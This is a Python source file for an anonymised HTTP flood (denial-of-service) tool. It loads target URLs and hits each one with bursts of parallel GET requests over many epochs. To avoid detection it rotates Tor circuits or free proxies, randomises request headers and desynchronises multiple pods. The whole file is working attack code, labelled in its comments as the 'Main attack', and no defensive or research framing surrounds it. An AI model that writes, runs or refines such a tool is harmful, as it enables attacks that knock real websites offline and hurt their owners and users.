# Run dependency injections
import os
from injectable import load_injection_container
import tekleo_common_utils
load_injection_container()
load_injection_container(str(os.path.dirname(tekleo_common_utils.__file__)))

# Other imports
from aiohttp import ClientSession
import asyncio
import threading
import time
import random
from stem import Signal
from stem.control import Controller
from services.service_aiohttp import ServiceAiohttp
from services.service_anonymity import ServiceAnonymity
from services.service_free_proxy import ServiceFreeProxy
from services.service_target import ServiceTarget

# Services
service_aiohttp = ServiceAiohttp()
service_anonymity = ServiceAnonymity()
service_free_proxy = ServiceFreeProxy()
service_target = ServiceTarget()



# Configuration
#-------------------------------------------------------------------------------------------------------------------
# Load configuration
TARGETS_MODE = os.environ['TARGETS_MODE']
TARGETS_FILE = os.environ['TARGETS_FILE']
TARGETS_URL = os.environ['TARGETS_URL']
NUMBER_OF_EPOCHS = int(os.environ['NUMBER_OF_EPOCHS'])
PARALLEL_SINGLE_URL_MIN_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MIN_REQUESTS'])
PARALLEL_SINGLE_URL_MAX_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MAX_REQUESTS'])
ENABLE_TOR_PROXY = bool(int(os.environ['ENABLE_TOR_PROXY']))
TOR_PROXY_IP_CHANGE_FREQUENCY = int(os.environ['TOR_PROXY_IP_CHANGE_FREQUENCY'])
ENABLE_FREE_PROXY = bool(int(os.environ['ENABLE_FREE_PROXY']))
FREE_PROXY_IP_CHANGE_FREQUENCY = int(os.environ['FREE_PROXY_IP_CHANGE_FREQUENCY'])

# Sanity check
if ENABLE_TOR_PROXY and ENABLE_FREE_PROXY:
    print('INVALID CONFIGURATION!!!! You can\'t turn on both TOR proxy and free VPN proxy')
    exit(-1)

# Load randomized headers
LIST_OF_HEADERS = service_anonymity.get_headers()
#-------------------------------------------------------------------------------------------------------------------



# TOR helpers
#-----------------------------------------------------------------------------------------------------------------------
TOR_CHANGE_IP_LOCK = threading.Lock()

def change_ip_tor():
    with TOR_CHANGE_IP_LOCK:
        time.sleep(1)
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='password')
            controller.signal(Signal.NEWNYM)
        time.sleep(1)
#-----------------------------------------------------------------------------------------------------------------------


# Main attack
#-----------------------------------------------------------------------------------------------------------------------
async def epoch(epoch_number: int):
    print('\n\n------- Attack Epoch #' + str(epoch_number) + ' -------')

    # Open session
    session = ClientSession()

    # Load free proxies
    free_proxies = []
    if ENABLE_FREE_PROXY:
        # Load proxies & if there's no available proxy - close session and exit
        free_proxies = await service_anonymity.get_free_proxies_working(session)
        if len(free_proxies) == 0:
            print('main.epoch(): WARNING!!! No available free proxy was found, skipping epoch ' + str(epoch_number))
            delay = random.randint(4, 11)
            time.sleep(delay)
            await session.close()
            return

    # Select proxy
    proxy = None
    if ENABLE_TOR_PROXY:
        proxy = "http://127.0.0.1:8118"
    elif ENABLE_FREE_PROXY:
        proxy = random.choice(free_proxies)
    if proxy:
        print('main.epoch(): Selected proxy=' + proxy)
    else:
        print('main.epoch(): WARNING!!! Proxy is disabled')

    # Track errors
    check_my_ip_consecutive_errors = 0

    # Load targets
    LIST_OF_URLS = []
    if TARGETS_MODE.lower() == 'url':
        LIST_OF_URLS = service_target.get_targets_from_url(TARGETS_URL)
    if TARGETS_MODE.lower() == 'file':
        LIST_OF_URLS = service_target.get_targets_from_file(TARGETS_FILE)
    print('main.epoch(): Loaded targets')
    for t in LIST_OF_URLS:
        print('main.epoch(): Target ' + t)

    # Randomize links
    random.shuffle(LIST_OF_URLS)

    # For each target
    for i in range(0, len(LIST_OF_URLS)):
        # Get URL & headers
        target_url = LIST_OF_URLS[i]
        headers = random.choice(LIST_OF_HEADERS)

        # If too many errors when checking your IP - change to another proxy
        if check_my_ip_consecutive_errors >= 3:
            if ENABLE_FREE_PROXY:
                proxy = random.choice(free_proxies)
                print('main.epoch(): Selected proxy=' + proxy + ' (after change due to repeated errors)')
                check_my_ip_consecutive_errors = 0
            if ENABLE_TOR_PROXY:
                change_ip_tor()
                check_my_ip_consecutive_errors = 0
        # If scheduled - change IP
        else:
            if ENABLE_TOR_PROXY and TOR_PROXY_IP_CHANGE_FREQUENCY > 0:
                if i > 0 and i % TOR_PROXY_IP_CHANGE_FREQUENCY == 0:
                    change_ip_tor()
                    check_my_ip_consecutive_errors = 0
            if ENABLE_FREE_PROXY and FREE_PROXY_IP_CHANGE_FREQUENCY > 0:
                if i > 0 and i % FREE_PROXY_IP_CHANGE_FREQUENCY == 0:
                    proxy = random.choice(free_proxies)
                    print('main.epoch(): Selected proxy=' + proxy + ' (after change)')
                    check_my_ip_consecutive_errors = 0

        # Make sure your current IP is hidden
        check_my_ip_result = await service_anonymity.check_my_ip(session, proxy=proxy)

        # Track ip errors
        if check_my_ip_result.status_code == 200:
            check_my_ip_consecutive_errors = 0
        else:
            check_my_ip_consecutive_errors = check_my_ip_consecutive_errors + 1

        # Determine how many requests we need to make
        number_of_requests = random.randint(PARALLEL_SINGLE_URL_MIN_REQUESTS, PARALLEL_SINGLE_URL_MAX_REQUESTS)

        # Generate URLs
        current_target_urls = [target_url for i in range(0, number_of_requests)]

        # Run requests
        results, t = await service_aiohttp.http_get_with_aiohttp_parallel(session, current_target_urls, headers=headers, proxy=proxy, timeout=15, ignore_json=True, ignore_body=True)
        service_aiohttp.debug_stats(target_url, results, t)

    # Close session
    await session.close()
#-----------------------------------------------------------------------------------------------------------------------



async def main():
    # Initial delay to allow different pods to be out of synch
    delay = random.randint(1, 11)
    time.sleep(delay)

    # Main attack loop
    for i in range(0, NUMBER_OF_EPOCHS):
        await epoch(i)



asyncio.run(main())



